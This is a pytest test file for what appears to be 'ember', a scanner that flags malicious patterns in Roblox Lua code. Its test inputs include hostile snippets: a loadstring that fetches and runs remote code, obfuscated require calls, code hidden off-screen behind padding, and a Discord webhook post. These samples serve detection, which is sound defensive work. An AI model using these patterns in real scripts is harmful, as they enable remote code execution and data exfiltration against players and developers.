import pytest

from ember import Severity, scan_source


def ids(src, **kw):
    return [f.rule.id for f in scan_source(src, **kw)]


def only(src, rule_id):
    return [f for f in scan_source(src) if f.rule.id == rule_id]


# EMB001 ------------------------------------------------------------------

@pytest.mark.parametrize("call", [
    "require(123456789)",
    "require (123456789)",
    "require(0x75BCD15)",
    "require(61728394 * 2 + 1)",
    'require(tonumber("123456789"))',
    'require(tonumber("75BCD15", 16))',
    "require((123456789))",
])
def test_remote_require_variants(call):
    found = only(call, "EMB001")
    assert len(found) == 1
    assert "123456789" in found[0].message
    assert found[0].severity == Severity.CRITICAL


def test_remote_require_through_variable_and_pcall():
    src = "local id = 1000 * 5\nrequire(id)\npcall(require, id)\n"
    found = only(src, "EMB001")
    assert [f.line for f in found] == [2, 3]
    assert "stored in `id`" in found[0].message


def test_local_requires_are_not_flagged():
    src = """
local M = require(script.Parent.Module)
local C = require(game.ReplicatedStorage:WaitForChild("Config"))
local P = require("@pkg/thing")
local Z = require(0)
"""
    assert ids(src) == []


# EMB003 / EMB004 -----------------------------------------------------------

def test_loadstring_with_http_is_rce():
    src = 'loadstring(game:HttpGet("https://example.com/x.lua"))()'
    assert "EMB003" in ids(src)
    assert "EMB004" not in ids(src)


def test_plain_loadstring():
    assert ids("local f = loadstring(code)") == ["EMB004"]


def test_hidden_loadstring_with_http_is_rce():
    src = 'local run = getfenv()["loadstring"]\nrun(game.HttpService:GetAsync(url))()'
    assert "EMB003" in ids(src)


# EMB005 / EMB006 / EMB007 ---------------------------------------------------

def test_getfenv_dynamic_is_high():
    found = only("local r = getfenv()[name]", "EMB005")
    assert found[0].severity == Severity.HIGH


def test_setfenv_plain_is_medium():
    assert only("setfenv(1, {})", "EMB005")[0].severity == Severity.MEDIUM


@pytest.mark.parametrize("expr", [
    r'"\114\101\113\117\105\114\101"',
    "string.char(114, 101, 113, 117, 105, 114, 101)",
    '("eriuqer"):reverse()',
    'string.reverse("eriuqer")',
    '"req" .. "uire"',
])
def test_hidden_require_name(expr):
    found = only(f"local x = env[{expr}]", "EMB006")
    assert found and "`require`" in found[0].message


def test_encoded_string_is_decoded():
    found = only("print(string.char(104, 101, 108, 108, 111, 32, 116, 104, 101, 114, 101))", "EMB007")
    assert found and '"hello there"' in found[0].message


def test_normal_strings_are_not_flagged():
    src = 'local s = "Welcome to my game!"\nlocal emoji = "\\240\\159\\148\\165"\nprint(("abc"):upper())'
    assert ids(src) == []


# EMB008 --------------------------------------------------------------------

def test_offscreen_code():
    found = only("local a = 1" + " " * 150 + "require(5)", "EMB008")
    assert found and "150 columns" in found[0].message


def test_padding_before_comment_is_ignored():
    assert only("local a = 1" + " " * 150 + "-- note", "EMB008") == []


# EMB009 / EMB010 -------------------------------------------------------------

def test_numeric_blob():
    blob = "local t = {" + ",".join(str(i % 256) for i in range(1500)) + "}"
    assert "EMB009" in ids(blob)


def test_obfuscator_signature():
    assert "EMB010" in ids("-- This file was protected using Luraph Obfuscator v14\nreturn 1")


# EMB011 / EMB012 -------------------------------------------------------------

def test_discord_webhook_and_paste_host():
    src = 'post("https://discordapp.com/api/webhooks/1/abc")\nget("https://pastebin.com/raw/abc")'
    assert ids(src) == ["EMB011", "EMB012"]


# Suppression -----------------------------------------------------------------

def test_line_suppression():
    assert ids("require(123) -- ember-ignore") == []
    assert ids("require(123) -- ember-ignore EMB004") == ["EMB001"]
    assert ids("require(123) -- ember-ignore: EMB001") == []


def test_file_suppression():
    assert ids("-- ember-ignore-file\nrequire(123)") == []


def test_rule_selection():
    src = "require(123)\nloadstring(x)"
    assert ids(src, rules={"EMB004"}) == ["EMB004"]


def test_confusable_identifier_blob():
    names = ["IlIl" + "".join("lI"[(i >> b) & 1] for b in range(6)) for i in range(60)]
    line = "local " + ";".join(f"{n}={n}+1" for n in names) + " " * 10
    line = line + "--" if len(line) >= 1000 else line + ";" * (1000 - len(line))
    assert "look-alike" in only(line, "EMB009")[0].message


def test_json_and_comment_lines_are_not_blobs():
    json_line = 'local s = [[{"a":' + ",".join(f'"key{i}":"value{i}"' for i in range(150)) + "}]]"
    assert only(json_line, "EMB009") == []
    assert only("--" + "x9Kq" * 400, "EMB009") == []


def test_getfenv_field_access():
    assert only("local expect = getfenv().expect", "EMB005")[0].severity == Severity.INFO
    assert only("local r = getfenv().require", "EMB005")[0].severity == Severity.HIGH


def test_binary_escapes_are_not_encoded_strings():
    assert only(r'local sig = "\x89PNG\x0D\x0A\x1A\x0A"', "EMB007") == []
    assert only(r'local s = "\u{261D}(\u{295}\u{2299}\u{1E15}\u{2299}\u{294})\u{261D}"', "EMB007") == []
